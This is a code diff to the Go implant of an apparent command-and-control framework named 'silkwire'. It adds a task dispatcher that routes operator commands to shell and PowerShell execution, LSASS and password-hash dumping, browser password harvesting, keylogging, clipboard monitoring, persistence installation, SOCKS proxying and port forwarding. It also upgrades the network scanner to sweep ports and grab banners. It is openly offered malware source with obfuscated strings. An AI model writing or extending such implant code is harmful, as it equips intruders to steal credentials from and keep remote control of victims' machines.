@@ -17,7 +17,115 @@ import (
 	pb "silkwire/proto"
 )
 
-// ExecuteCommand handles incoming command execution
+// ExecuteTask handles task execution for polling mode (returns output and error)
+// This supports all non-streaming commands (PTY requires streaming mode)
+func (i *Implant) ExecuteTask(task *pb.Task) ([]byte, error) {
+	var output []byte
+	var err error
+
+	if DebugMode {
+		log.Printf("Executing task: Type=%v, Command='%s', Args=%v", task.Type, task.Command, task.Args)
+	}
+
+	switch task.Type {
+	case pb.CommandMessage_SHELL:
+		output, err = i.ExecuteShell(task.Command, task.Args)
+	case pb.CommandMessage_POWERSHELL:
+		output, err = i.ExecutePowerShell(task.Command)
+	case pb.CommandMessage_PROCESS_LIST:
+		output, err = i.GetProcessList()
+	case pb.CommandMessage_INFO:
+		output, err = i.GetSystemInfo()
+	case pb.CommandMessage_SLEEP:
+		err = i.UpdateSleepInterval(task.Args)
+		output = []byte(deobfStr("sleep_updated"))
+	case pb.CommandMessage_SCREENSHOT, pb.CommandMessage_SCREENSHOT_CAPTURE:
+		var outputStr string
+		outputStr, err = CaptureScreenshot()
+		output = []byte(outputStr)
+	case pb.CommandMessage_NETWORK_SCAN:
+		output, err = i.NetworkScan(task.Args, nil)
+	case pb.CommandMessage_IFCONFIG:
+		output, err = i.GetNetworkInterfaces()
+	case pb.CommandMessage_UPLOAD:
+		output, err = i.HandleUpload(task.Args, task.Data)
+	case pb.CommandMessage_DOWNLOAD:
+		output, err = i.HandleDownload(task.Args)
+	case pb.CommandMessage_HASHDUMP:
+		output, err = i.DumpHashes()
+	case pb.CommandMessage_SOCKS_START:
+		port := 1080
+		if len(task.Args) > 0 {
+			if p, parseErr := strconv.Atoi(task.Args[0]); parseErr == nil {
+				port = p
+			}
+		}
+		output, err = i.StartSOCKSProxy(port)
+	case pb.CommandMessage_SOCKS_STOP:
+		output, err = i.StopSOCKSProxy()
+	case pb.CommandMessage_PORTFWD_ADD:
+		output, err = i.HandlePortForwardCommand("add", task.Args)
+	case pb.CommandMessage_PORTFWD_REMOVE:
+		output, err = i.HandlePortForwardCommand("remove", task.Args)
+	case pb.CommandMessage_PORTFWD_LIST:
+		output, err = i.ListPortForwards()
+	case pb.CommandMessage_PERSIST_INSTALL:
+		method := "registry"
+		if len(task.Args) > 0 {
+			method = task.Args[0]
+		}
+		output, err = i.InstallPersistence(method)
+	case pb.CommandMessage_PERSIST_REMOVE:
+		method := "registry"
+		if len(task.Args) > 0 {
+			method = task.Args[0]
+		}
+		output, err = i.RemovePersistence(method)
+	case pb.CommandMessage_PERSIST_LIST:
+		output, err = i.ListPersistence()
+	case pb.CommandMessage_DUMP_LSASS:
+		output, err = i.DumpLSASS()
+	case pb.CommandMessage_HARVEST_CHROME:
+		output, err = i.HarvestChromePasswords()
+	case pb.CommandMessage_HARVEST_FIREFOX:
+		output, err = i.HarvestFirefoxPasswords()
+	case pb.CommandMessage_HARVEST_EDGE:
+		output, err = i.HarvestEdgePasswords()
+	case pb.CommandMessage_HARVEST_ALL_BROWSERS:
+		output, err = i.HarvestAllBrowsers()
+	case pb.CommandMessage_CLIPBOARD_MONITOR:
+		duration := 30
+		if len(task.Args) > 0 {
+			if d, parseErr := strconv.Atoi(task.Args[0]); parseErr == nil {
+				duration = d
+			}
+		}
+		var outputStr string
+		outputStr, err = MonitorClipboard(duration)
+		output = []byte(outputStr)
+	case pb.CommandMessage_KEYLOG_START:
+		var outputStr string
+		outputStr, err = StartKeylogger()
+		output = []byte(outputStr)
+	case pb.CommandMessage_KEYLOG_STOP:
+		var outputStr string
+		outputStr, err = StopKeylogger()
+		output = []byte(outputStr)
+	case pb.CommandMessage_TOKEN_LIST:
+		output, err = i.ListTokens()
+	case pb.CommandMessage_TOKEN_REVERT:
+		output, err = i.RevertToken()
+	// PTY commands require streaming mode
+	case pb.CommandMessage_PTY_START, pb.CommandMessage_PTY_STDIN, pb.CommandMessage_PTY_RESIZE, pb.CommandMessage_PTY_STOP:
+		err = fmt.Errorf("PTY commands require streaming mode")
+	default:
+		err = fmt.Errorf("unsupported task type: %v", task.Type)
+	}
+
+	return output, err
+}
+
+// ExecuteCommand handles incoming command execution (streaming mode)
 func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb.CommandMessage) {
 	var output []byte
 	var err error
@@ -63,7 +171,7 @@ func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb
 		outputStr, err = CaptureScreenshot()
 		output = []byte(outputStr)
 	case pb.CommandMessage_NETWORK_SCAN:
-		output, err = i.NetworkScan(cmd.Args)
+		output, err = i.NetworkScan(cmd.Args, cmd.NetworkScanOptions)
 	case pb.CommandMessage_INFO:
 		output, err = i.GetSystemInfo()
 	case pb.CommandMessage_MODULE_LOAD:
@@ -84,6 +192,8 @@ func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb
 		output, err = i.HandleDownload(cmd.Args)
 	case pb.CommandMessage_HASHDUMP:
 		output, err = i.DumpHashes()
+	case pb.CommandMessage_IFCONFIG:
+		output, err = i.GetNetworkInterfaces()
 
 	// SOCKS Proxy & Port Forwarding
 	case pb.CommandMessage_SOCKS_START:
@@ -378,23 +488,37 @@ func (i *Implant) TakeScreenshot() ([]byte, error) {
 	return []byte(deobfStr("screenshot_ni")), nil
 }
 
-// NetworkScan performs basic network scanning
-func (i *Implant) NetworkScan(args []string) ([]byte, error) {
+// NetworkScan performs advanced network scanning
+func (i *Implant) NetworkScan(args []string, options *pb.NetworkScanOptions) ([]byte, error) {
+	// If options provided, use them
+	if options != nil {
+		ports := make([]int, len(options.Ports))
+		for i, p := range options.Ports {
+			ports[i] = int(p)
+		}
+
+		scanner := NewScanner(
+			options.TargetRange,
+			ports,
+			options.ScanUdp,
+			int(options.Threads),
+			int(options.TimeoutMs),
+			options.BannerGrab,
+		)
+
+		return scanner.Scan()
+	}
+
+	// Fallback to legacy behavior if no options (or just args provided)
 	if len(args) == 0 {
 		return nil, fmt.Errorf(deobfStr("no_target"))
 	}
 
 	target := args[0]
 
-	// Simple ping test (basic implementation)
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command(deobfStr("ping"), "-n", "1", target)
-	} else {
-		cmd = exec.Command(deobfStr("ping"), "-c", "1", target)
-	}
-
-	return cmd.CombinedOutput()
+	// Use new scanner even for simple scan
+	scanner := NewScanner(target, nil, false, 1, 1000, false)
+	return scanner.Scan()
 }
 
 // GetSystemInfo collects comprehensive system information
@@ -747,4 +871,38 @@ func (i *Implant) dumpLinuxHashes() ([]byte, error) {
 	result += string(content)
 
 	return []byte(result), nil
+}
+
+// GetNetworkInterfaces retrieves network interface information using OS-appropriate commands
+func (i *Implant) GetNetworkInterfaces() ([]byte, error) {
+	var cmd *exec.Cmd
+
+	if runtime.GOOS == "windows" {
+		// Use ipconfig /all on Windows
+		cmd = exec.Command("ipconfig", "/all")
+	} else {
+		// Try ip addr first (modern Linux), fallback to ifconfig (legacy/BSD)
+		cmd = exec.Command("ip", "addr")
+		output, err := cmd.CombinedOutput()
+
+		// If ip command fails, try ifconfig
+		if err != nil {
+			cmd = exec.Command("ifconfig", "-a")
+			output, err = cmd.CombinedOutput()
+			if err != nil {
+				// If both fail, return error
+				return nil, fmt.Errorf("failed to get network interfaces: %v", err)
+			}
+			return output, nil
+		}
+		return output, nil
+	}
+
+	// Execute the command (Windows path)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return nil, fmt.Errorf("failed to get network interfaces: %v", err)
+	}
+
+	return output, nil
 }
